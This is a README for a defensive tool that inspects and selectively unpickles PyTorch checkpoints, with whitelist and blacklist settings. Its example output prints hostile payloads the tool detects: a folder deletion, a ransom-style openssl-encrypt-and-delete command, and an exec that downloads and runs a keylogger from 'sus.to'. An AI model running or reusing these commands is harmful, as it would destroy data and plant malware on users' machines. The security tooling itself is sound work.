# pickle_inspector 🥒🔬
Check what is in the pickle before eating it.

It works on any type of pickle, but was made with `torch` in mind.

NOTE:
torch == 1.13.0 breaks using custom unpicklers, see https://github.com/pytorch/pytorch/issues/88438
until this is fixed, stick to 1.12.x or older.

## Scanning pickles via command line
**tl;dr** just let me scan my pickles.
```sh
python3 scan_pickle.py --preset stable_diffusion_v1 --in sus.ckpt
```
```
> Scanning file(s): ['sus.ckpt']
> Using white list: ['collections.OrderedDict', 'torch._utils._rebuild_tensor_v2', 'torch.HalfStorage', 'torch.FloatStorage', 'torch.IntStorage', 'torch.LongStorage', 'pytorch_lightning.callbacks.model_checkpoint.ModelCheckpoint', 'numpy.core.multiarray.scalar', 'numpy.dtype', '_codecs.encode']
> Reading sus.ckpt
> Found pickle in zip: archive/data.pkl
> Scanning: archive/data.pkl
> found: torch._utils._rebuild_tensor_v2
> found: torch.FloatStorage
> found: collections.OrderedDict
> found: torch.IntStorage
> found: torch.LongStorage
> found: pytorch_lightning.callbacks.model_checkpoint.ModelCheckpoint
> found: numpy.core.multiarray.scalar
> found: numpy.dtype
> found: _codecs.encode
> Scan for sus.ckpt PASSED ✅
```
### Script usage
```
usage: Scan pickles [-h] -i INPUT [INPUT ...] [-p {stable_diffusion_v1}] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]]

optional arguments:
  -h, --help            show this help message and exit
  -i INPUT [INPUT ...], --in INPUT [INPUT ...]
                        path to a pickle(s) or zip(s) containing pickles
  -p {stable_diffusion_v1}, --preset {stable_diffusion_v1}
                        a whitelist preset to use: stable_diffusion_v1
  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]
                        whitelist of modules and functions to allow
  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]
                        blacklist of modules and functions to block
```
## Inspecting
Inspect without unpickling.
```py
import torch
import pickle_inspector
result = torch.load('sus.pt', pickle_module=pickle_inspector.inspector)
for c in result.classes:
    print(c)
```
notice calls to `shutil.rmtree`, `os.system` or similar
```
> shutil.rmtree
> torch._utils._rebuild_tensor_v2
> collections.OrderedDict
> numpy.core.multiarray.scalar
> os.system
> numpy.dtype
> _codecs.encode
```
so we are taking a closer look at what is being called
```py
for c in result.calls:
    print(c)
```
and it seems like someone tried to delete something and ransom a file
```
> shutil.rmtree(('/very/important/folder'), {})
> collections.OrderedDict((), {})
> torch._utils._rebuild_tensor_v2((None, 0, (1000,), (1,), False, collections.OrderedDict((), {})), {})
...
> torch._utils._rebuild_tensor_v2((None, 0, (), (), False, collections.OrderedDict((), {})), {})
> os.system(('openssl enc -aes-128-ecb -in important_file -out give_money.enc -K 1337B00B135DEADBEEF; rm important_file'), {})
> numpy.dtype(('f8', False, True), {})
> numpy.dtype.__setstate__(((3, '<', None, None, None, -1, -1, 0),), {})
> _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})
> numpy.core.multiarray.scalar((numpy.dtype(('f8', False, True), {}), _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})), {})
```
## Controlled unpickling
Inspect and unpickle using white and blacklists.

```py
import torch
from pickle_inspector import UnpickleConfig, UnpickleControlled, PickleModule
config = UnpickleConfig()
# only allow  modules, classes and funcions in the whitelist
# the rest will be stubbed
config.whitelist = [
        'torch._utils._rebuild_tensor_v2',
        'torch.FloatStorage',
        'torch.IntStorage',
        'torch.LongStorage',
        'numpy.core.multiarray.scalar',
        'numpy.dtype',
        'collections.OrderedDict',
        '_codecs.encode'
]
result = torch.load('model.ckpt', pickle_module = PickleModule(UnpickleControlled, config))
state_dict = result.structure
for c in result.classes:
    print(c)
```
```
> torch._utils._rebuild_tensor_v2
> torch.FloatStorage
...
> STUBBED exec
> collections.OrderedDict
...
```
```py
for c in results.calls:
    if 'exec' in c:
        print(c)
```
```py
> exec('import os;os.system("wget https://sus.to/keylog;chmod +x keylog;./keylog &")')
```
## Blacklist & Whitelist
The whitelist has priority over the blacklist.

If the blacklist contains items everything will be allowed except items in the blacklist,\
or items in the blacklist and in the whitelist. This is useful using wildcards.

Example: Block everything within `torch` except `torch.FloatStorage`
```py
conf.blacklist = ['torch.*']
conf.whitelist = ['torch.FloatStorage']
```

If the blacklist is empty and the whitelist contains items, \
everything except items in the whitelist will be blocked.

## Safe whitelist for stable diffusion v1
A premade whitelist for stable diffusion v1 is available in this project.

Example: Scan a stable diffusion checkpoint
```py
import torch
from pickle_inspector import UnpickleConfig, PickleModule, UnpickleInspector, whitelists
conf = UnpickleConfig(whitelist = whitelists.stable_diffusion_v1)
torch.load('sd-v1-4.ckpt', pickle_module=PickleModule(UnpickleInspector, conf))
```

Tested with python 3.9 and torch 1.12.1
